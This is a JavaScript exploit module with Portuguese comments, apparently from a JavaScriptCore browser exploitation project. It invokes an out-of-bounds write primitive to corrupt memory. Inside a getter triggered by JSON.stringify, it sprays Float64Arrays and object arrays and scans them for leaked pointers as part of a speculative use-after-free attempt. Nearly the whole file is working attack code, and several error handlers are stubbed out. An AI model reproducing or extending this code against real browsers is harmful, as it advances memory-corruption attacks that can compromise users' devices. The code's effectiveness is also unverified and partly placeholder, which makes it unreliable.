// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForUAFLeak";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, potential_leaks: [] };

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

class CheckpointForUAFLeak {
    constructor(id) {
        this.id_marker = `UAFLeakCheckpoint-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "UAFLeak_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        current_test_results = { success: false, message: "Getter chamado, tentando UAF especulativo e spray.", error: null, potential_leaks: [] };

        let details_log = [];
        let found_potential_leak = false;

        try {
            if (!oob_array_buffer_real || !oob_read_absolute) {
                throw new Error("oob_array_buffer_real ou oob_read_absolute não disponíveis.");
            }

            // 1. Criar o objeto alvo cujo endereço gostaríamos de vazar
            const target_obj_for_leak = { "identify_me": 0xBADBEEF0 + Date.now() }; // Valor único
            details_log.push(`Target object for leak created: ${JSON.stringify(target_obj_for_leak)}`);

            // 2. Spray intensivo de diferentes tipos de arrays no getter
            // A esperança é que um deles reutilize uma região de memória liberada (UAF)
            // de uma forma que nos permita ler um ponteiro para target_obj_for_leak,
            // ou que a estrutura de um desses arrays seja corrompida.
            const spray_count = 150;
            const float_spray_pattern = Math.PI; // Padrão para Float64Arrays
            const obj_spray_pattern_obj = { "pattern": true }; // Padrão para Object Arrays
            
            let float_arrays_sprayed = [];
            let object_arrays_sprayed = [];

            logS3("DENTRO DO GETTER: Iniciando spray de Float64Array e Object Array...", "info", FNAME_GETTER);
            for (let i = 0; i < spray_count; i++) {
                try {
                    // Float64Array
                    let fa = new Float64Array(8); // 64 bytes
                    for(let k=0; k<fa.length; k++) fa[k] = float_spray_pattern + i; // Padrão único por array
                    float_arrays_sprayed.push(fa);

                    // Object Array
                    let oa = new Array(4);
                    if (i === Math.floor(spray_count / 2) || i === Math.floor(spray_count / 3)) { // Colocar o alvo em alguns
                        oa[0] = target_obj_for_leak;
                        oa[1] = obj_spray_pattern_obj;
                        oa[2] = i;
                        oa[3] = null;
                    } else {
                        oa[0] = obj_spray_pattern_obj;
                        oa[1] = i;
                        oa[2] = null;
                        oa[3] = target_obj_for_leak; // Colocar em outro índice também
                    }
                    object_arrays_sprayed.push(oa);
                } catch (e_spray_alloc) {
                    details_log.push(`Erro durante spray na iteração ${i}: ${e_spray_alloc.message}`);
                }
            }
            details_log.push(`Spray de ${float_arrays_sprayed.length} Float64Arrays e ${object_arrays_sprayed.length} Object Arrays concluído.`);
            logS3(`DENTRO DO GETTER: Spray concluído. Verificando Float64Arrays por leaks...`, "info", FNAME_GETTER);

            // 3. Verificar os Float64Arrays por valores que não sejam o padrão
            for (let i = 0; i < float_arrays_sprayed.length; i++) {
                const fa_check = float_arrays_sprayed[i];
                if (!fa_check) continue;
                for (let j = 0; j < fa_check.length; j++) {
                    const float_val = fa_check[j];
                    if (float_val !== (float_spray_pattern + i)) { // Diferente do padrão esperado para ESTE array
                        const temp_buf = new ArrayBuffer(8);
                        const temp_dv = new DataView(temp_buf);
                        temp_dv.setFloat64(0, float_val, true);
                        const low = temp_dv.getUint32(0, true);
                        const high = temp_dv.getUint32(4, true);
                        const potential_ptr = new AdvancedInt64(low, high);
                        
                        const leak_info_str = `UAF_LEAK? Float64Array[${i}][${j}] = ${float_val} -> ${potential_ptr.toString(true)}`;
                        logS3(leak_info_str, "leak", FNAME_GETTER);
                        current_test_results.potential_leaks.push({
                            source: `Float64Array[${i}][${j}]`,
                            float_value: float_val,
                            hex_value: potential_ptr.toString(true)
                        });
                        found_potential_leak = true;
                    }
                }
            }

            // 4. Verificar os Object Arrays por corrupção (ex: length inesperado, tipo de elemento)
            logS3(`DENTRO DO GETTER: Verificando Object Arrays por corrupção...`, "info", FNAME_GETTER);
            for (let i = 0; i < object_arrays_sprayed.length; i++) {
                const oa_check = object_arrays_sprayed[i];
                if (!oa_check || !Array.isArray(oa_check)) {
                    details_log.push(`ObjectArray[${i}] não é um array ou é nulo! Tipo: ${Object.prototype.toString.call(oa_check)}`);
                    found_potential_leak = true; // Isso é uma corrupção
                    continue;
                }
                if (oa_check.length !== 4) { // Tamanho original era 4
                     details_log.push(`ObjectArray[${i}].length: ${oa_check.length} (Esperado 4)`);
                     found_potential_leak = true;
                }
                // Verificar se target_obj_for_leak ainda está lá ou se foi substituído por um número (ponteiro)
                for (let j=0; j<oa_check.length; j++) {
                    if (typeof oa_check[j] === 'number' && oa_check[j] > 0x100000) { // Heurística para ponteiro
                        const leak_info_str = `UAF_LEAK? ObjectArray[${i}][${j}] é número: ${toHex(oa_check[j], 64)}`;
                        logS3(leak_info_str, "leak", FNAME_GETTER);
                        current_test_results.potential_leaks.push({
                             source: `ObjectArray[${i}][${j}]`,
                             numeric_value: toHex(oa_check[j], 64)
                        });
                        found_potential_leak = true;
                    }
                }
            }


            if (found_potential_leak) {
                current_test_results.success = true;
                current_test_results.message = "Potencial(is) vazamento(s) de endereço ou corrupção observada(s) nos arrays pulverizados!";
            } else {
                current_test_results.message = "Nenhum vazamento de endereço óbvio ou corrupção nos arrays pulverizados.";
            }
            current_test_results.details = details_log.join('; ');

        } catch (e) {
            logS3(`DENTRO DO GETTER: ERRO GERAL: ${e.message}`, "error", FNAME_GETTER);
            current_test_results.error = String(e);
            current_test_results.message = `Erro geral no getter: ${e.message}`;
        }
        return 0xBADF00D;
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForUAFLeak.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_uaf_leak_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST = "executeUAFLeakTestInGetter"; // Nome interno
    logS3(`--- Iniciando Teste de UAF Especulativo e Spray no Getter ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado.", error: null, potential_leaks: [] };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} do oob_data completada.`, "info", FNAME_TEST);

        const checkpoint_obj = new CheckpointForUAFLeak(1);
        logS3(`CheckpointForUAFLeak objeto criado. ID: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) { /* ... */ }

    } catch (mainError) { /* ... */ }
    finally { /* ... */ }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE UAF/SPRAY: SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO TESTE UAF/SPRAY: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da tentativa: ${current_test_results.details}`, "info", FNAME_TEST);
        }
        if (current_test_results.potential_leaks && current_test_results.potential_leaks.length > 0) {
            logS3("Potenciais Leaks Detalhados:", "leak", FNAME_TEST);
            current_test_results.potential_leaks.forEach(leak => {
                logS3(`  Fonte: ${leak.source}, Float: ${leak.float_value}, Hex: ${leak.hex_value || leak.numeric_value}`, "leak", FNAME_TEST);
            });
        }
    } else {
        logS3("RESULTADO TESTE UAF/SPRAY: Getter NÃO foi chamado.", "error", FNAME_TEST);
    }

    clearOOBEnvironment();
    logS3(`--- Teste de UAF Especulativo e Spray Concluído ---`, "test", FNAME_TEST);
}
